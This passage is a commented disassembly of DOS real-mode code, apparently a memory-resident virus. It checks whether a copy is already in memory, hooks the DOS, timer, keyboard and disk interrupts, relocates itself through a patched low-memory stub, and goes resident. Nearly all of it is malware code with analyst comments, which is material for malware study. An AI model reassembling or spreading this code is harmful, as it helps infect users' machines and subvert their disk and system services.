0B9A  8BD0           MOV    DX,AX
0B9C  8BF0           MOV    SI,AX
0B9E  8BF8           MOV    DI,AX
0BA0  C3             RET
;---------------------------------------------------------------------------
                                            ;Detect Speed of machine
0BA1  B400           MOV    AH,00           ;Read system timer counter
0BA3  CD1A           INT    1A
0BA5  8BDA           MOV    BX,DX           ;BX=DX - Low order part of clock
0BA7  CD1A           INT    1A              ;Read system timer counter
0BA9  3BDA           CMP    BX,DX
0BAB  74FA           JZ     0BA7
0BAD  33F6           XOR    SI,SI
0BAF  8BDA           MOV    BX,DX
0BB1  CD1A           INT    1A
0BB3  46             INC    SI
0BB4  3BDA           CMP    BX,DX
0BB6  74F9           JZ     0BB1
0BB8  2EC7064A0000A0 MOV    CS:[004A],A000
0BBF  8BDE           MOV    BX,SI
0BC1  83EB50         SUB    BX,0050
0BC4  81FB000A       CMP    BX,0A00
0BC8  7309           JNC    0BD3
0BCA  B104           MOV    CL,04
0BCC  D3E3           SHL    BX,CL
0BCE  2E891E4A00     MOV    CS:[004A],BX
0BD3  C3             RET
;---------------------------------------------------------------------------
0BD4  1E             PUSH   DS              ;Init timer variables
0BD5  0E             PUSH   CS
0BD6  1F             POP    DS
0BD7  C6064F0000     MOV    [004F],00
0BDC  C6065C0000     MOV    [005C],00
0BE1  E440           IN     AL,[40]
0BE3  8AE0           MOV    AH,AL
0BE5  E440           IN     AL,[40]
0BE7  8AC4           MOV    AL,AH
0BE9  2E32060500     XOR    AL,CS:[0005]
0BEE  3C1F           CMP    AL,1F
0BF0  7205           JC     0BF7
0BF2  C6064F0001     MOV    [004F],01
0BF7  C70603000100   MOV    [0003],0001
0BFD  C70610010000   MOV    [0110],0000
0C03  C6060F0101     MOV    [010F],01
0C08  C6064E0000     MOV    [004E],00
0C0D  1F             POP    DS
0C0E  C3             RET
;---------------------------------------------------------------------------
0C0F  1E             PUSH   DS
0C10  06             PUSH   ES
0C11  33C0           XOR    AX,AX
0C13  8ED8           MOV    DS,AX
0C15  A11304         MOV    AX,[0413]       ;Memory size in KByte
0C18  B106           MOV    CL,06
0C1A  D3E0           SHL    AX,CL
0C1C  8ED8           MOV    DS,AX           ;DS = A000 or 9E00
0C1E  33F6           XOR    SI,SI
0C20  8B443E         MOV    AX,[SI+3E]
0C23  3DCB3C         CMP    AX,3CCB
0C26  7434           JZ     0C5C
0C28  833E400EFE     CMP    [0E40],FFFE     ;(data in Boot Sector)
0C2D  7404           JZ     0C33
0C2F  F9             STC
0C30  EB4E           JMP    0C80
0C32  90             NOP
0C33  FA             CLI
0C34  B8404B         MOV    AX,4B40         ;Load Or Exec Program
0C37  CD21           INT    21              ; !!! AL = 40 ist false call
0C39  3D7856         CMP    AX,5678         ;Error code = 5678 ?
0C3C  741A           JZ     0C58            ; Yes - allready loaded
0C3E  C6067B0F01     MOV    [0F7B],01       ; No  - Set "Dos complet" flag
0C43  90             NOP
0C44  FB             STI
0C45  B82135         MOV    AX,3521         ;Get INT 21 addres
0C48  CD21           INT    21
0C4A  891ED006       MOV    [06D0],BX       ;Store INT 21 Orig addres
0C4E  8C06D206       MOV    [06D2],ES
0C52  BAD406         MOV    DX,06D4         ;(? New Offset of INT 21 ?)
0C55  B82125         MOV    AX,2521
0C58  F8             CLC
0C59  EB25           JMP    0C80
0C5B  90             NOP
0C5C  C7443EFEFF     MOV    [SI+3E],FFFE
0C61  33C0           XOR    AX,AX
0C63  8ED8           MOV    DS,AX
0C65  8EC0           MOV    ES,AX
0C67  BE0402         MOV    SI,0204         ;Set int vector 08 from 81
0C6A  BF2000         MOV    DI,0020
0C6D  B90200         MOV    CX,0002
0C70  FA             CLI
0C71  F3A5           REP    MOVSW
0C73  FB             STI
0C74  BE0C02         MOV    SI,020C         ;Set int vector 13 from 83
0C77  BF4C00         MOV    DI,004C
0C7A  B90200         MOV    CX,0002
0C7D  F3A5           REP    MOVSW
0C7F  F9             STC
0C80  07             POP    ES
0C81  1F             POP    DS
0C82  C3             RET
;---------------------------------------------------------------------------
0C83  E889FF         CALL   0C0F
0C86  7203           JC     0C8B
0C88  EB0B           JMP    0C95
0C8A  90             NOP
0C8B  B8404B         MOV    AX,4B40         ;Load or Execute Program
0C8E  CD21           INT    21              ; !!! AL = 40 ist false call
0C90  3D7856         CMP    AX,5678         ;Error code = 5678 ?
0C93  7513           JNZ    0CA8            ; No -
0C95  B8414B         MOV    AX,4B41         ; Yes -
0C98  BF0001         MOV    DI,0100
0C9B  2E8B8D2400     MOV    CX,CS:[DI+0024] ;
0CA0  BE0010         MOV    SI,1000
0CA3  03F7           ADD    SI,DI
0CA5  FC             CLD
0CA6  CD21           INT    21              ;
0CA8  8CC8           MOV    AX,CS
0CAA  051000         ADD    AX,0010
0CAD  8ED0           MOV    SS,AX
0CAF  BCEE0D         MOV    SP,0DEE
0CB2  50             PUSH   AX
0CB3  B8B80B         MOV    AX,0BB8
0CB6  50             PUSH   AX
0CB7  CB             RET    Far             ;>> Goto 0CB8

;---------------------------------------------------------------------------
0CB8  FC             CLD
0CB9  06             PUSH   ES
0CBA  E852FF         CALL   0C0F
0CBD  2E8C062600     MOV    CS:[0026],ES
0CC2  2E8C068100     MOV    CS:[0081],ES
0CC7  2E8C068500     MOV    CS:[0085],ES
0CCC  2E8C068900     MOV    CS:[0089],ES
0CD1  8CC0           MOV    AX,ES
0CD3  051000         ADD    AX,0010
0CD6  2E01065400     ADD    CS:[0054],AX
0CDB  2E01065600     ADD    CS:[0056],AX
0CE0  B8404B         MOV    AX,4B40         ;
0CE3  CD21           INT    21              ;
0CE5  3D7856         CMP    AX,5678         ;
0CE8  7513           JNZ    0CFD
0CEA  07             POP    ES
0CEB  2E8E165600     MOV    SS,CS:[0056]
0CF0  2E8B265000     MOV    SP,CS:[0050]
0CF5  E89EFE         CALL   0B96            ;Zero registers
0CF8  2EFF2E5200     JMP    Far CS:[0052]

0CFD  E873FE         CALL   0B73            ;Decode Text
0D00  E89EFE         CALL   0BA1            ;Detect speed of machine
0D03  33C0           XOR    AX,AX
0D05  8EC0           MOV    ES,AX
0D07  26A1FC03       MOV    AX,ES:[03FC]    ;Save INT FF Ofs into 0028
0D0B  2EA32800       MOV    CS:[0028],AX
0D0F  26A0FE03       MOV    AL,ES:[03FE]    ;Save INT FF Seg (Lo) into 002A
0D13  2EA22A00       MOV    CS:[002A],AL
0D17  26C706FC03F3A5 MOV    ES:[03FC],A5F3  ;0000:03FC = F3 A5 -> REP MOVSW
0D1E  26C606FE03CB   MOV    ES:[03FE],CB    ;     03FE = CB    -> RET Far
0D24  58             POP    AX              ;                     +---+---+
0D25  051000         ADD    AX,0010         ;
0D28  8EC0           MOV    ES,AX           ;
0D2A  0E             PUSH   CS              ;  Move from DS:0 to ES:0
0D2B  1F             POP    DS              ;  800 word
0D2C  B90010         MOV    CX,1000         ;
0D2F  D1E9           SHR    CX,1            ;
0D31  33F6           XOR    SI,SI           ;
0D33  8BFE           MOV    DI,SI           ;
0D35  06             PUSH   ES              ;
0D36  B83F0C         MOV    AX,0C3F         ;
0D39  50             PUSH   AX              ;
0D3A  EAFC030000     JMP    0000:03FC       ; +
                                            ; |
0D3F  8CC8           MOV    AX,CS        ; <--+
0D41  8ED0           MOV    SS,AX
0D43  BCEE0D         MOV    SP,0DEE
0D46  33C0           XOR    AX,AX
0D48  8ED8           MOV    DS,AX
0D4A  2EA12800       MOV    AX,CS:[0028]    ;Restore INT FF Ofs
0D4E  A3FC03         MOV    [03FC],AX
0D51  2EA02A00       MOV    AL,CS:[002A]    ;Restore INT FF Seg (Lo)
0D55  A2FE03         MOV    [03FE],AL
0D58  BB0010         MOV    BX,1000
0D5B  B104           MOV    CL,04
0D5D  D3EB           SHR    BX,CL
0D5F  83C340         ADD    BX,0040
0D62  B44A           MOV    AH,4A           ;Modify memory allocation
0D64  2E8E062600     MOV    ES,CS:[0026]
0D69  CD21           INT    21
0D6B  B82135         MOV    AX,3521         ;Get INT 21 vector
0D6E  CD21           INT    21
0D70  2E891ED006     MOV    CS:[06D0],BX    ;Store it
0D75  2E8C06D206     MOV    CS:[06D2],ES
0D7A  0E             PUSH   CS
0D7B  1F             POP    DS
0D7C  BAD406         MOV    DX,06D4         ;Set INT 21 vector
0D7F  B82125         MOV    AX,2521
0D82  CD21           INT    21
0D84  8E062600       MOV    ES,[0026]
0D88  268E062C00     MOV    ES,ES:[002C]    ;Segment of DOS ENVRONMENT string
0D8D  33FF           XOR    DI,DI
0D8F  B9FF7F         MOV    CX,7FFF
0D92  32C0           XOR    AL,AL
0D94  F2AE           REPNZ  SCASB
0D96  263805         CMP    ES:[DI],AL
0D99  E0F9           LOOPNZ 0D94
0D9B  8BD7           MOV    DX,DI
0D9D  83C203         ADD    DX,0003
0DA0  B8004B         MOV    AX,4B00
0DA3  06             PUSH   ES
0DA4  1F             POP    DS
0DA5  0E             PUSH   CS
0DA6  07             POP    ES
0DA7  BB7D00         MOV    BX,007D
0DAA  1E             PUSH   DS
0DAB  06             PUSH   ES
0DAC  50             PUSH   AX
0DAD  53             PUSH   BX
0DAE  51             PUSH   CX
0DAF  52             PUSH   DX
0DB0  0E             PUSH   CS
0DB1  1F             POP    DS
0DB2  B80835         MOV    AX,3508         ;Get INT 08 vector
0DB5  CD21           INT    21
0DB7  891E2103       MOV    [0321],BX       ;Stor it
0DBB  8C062303       MOV    [0323],ES
0DBF  BAEC02         MOV    DX,02EC         ;
0DC2  E80FFE         CALL   0BD4
0DC5  B80825         MOV    AX,2508         ;Set INT 08
0DC8  CD21           INT    21

0DCA  B80935         MOV    AX,3509         ;Get INT 09 vector
0DCD  CD21           INT    21
0DCF  891E0600       MOV    [0006],BX       ;Store it
0DD3  8C060800       MOV    [0008],ES
0DD7  BAB103         MOV    DX,03B1         ;Set INT 09 vector
0DDA  B80925         MOV    AX,2509
0DDD  CD21           INT    21

0DDF  B81335         MOV    AX,3513         ;Get INT 13 vector
0DE2  CD21           INT    21
0DE4  891E0A00       MOV    [000A],BX       ;Store it
0DE8  8C060C00       MOV    [000C],ES
0DEC  BA2605         MOV    DX,0526         ;Set INT 13 vector
0DEF  B81325         MOV    AX,2513
0DF2  CD21           INT    21
0DF4  5A             POP    DX
0DF5  59             POP    CX
0DF6  5B             POP    BX
0DF7  58             POP    AX
0DF8  07             POP    ES
0DF9  1F             POP    DS
0DFA  9C             PUSHF
0DFB  2EFF1ED006     CALL   Far CS:[06D0]
0E00  1E             PUSH   DS
0E01  07             POP    ES
0E02  B449           MOV    AH,49           ;Free allocated memory
0E04  CD21           INT    21
0E06  B44D           MOV    AH,4D           ;Get return code of subprocess
0E08  CD21           INT    21
0E0A  B431           MOV    AH,31           ;Terminate And Stay Resident
0E0C  BA0010         MOV    DX,1000
0E0F  B104           MOV    CL,04
0E11  D3EA           SHR    DX,CL
0E13  83C240         ADD    DX,0040
0E16  CD21           INT    21
;---------------------------------------------------------------------------














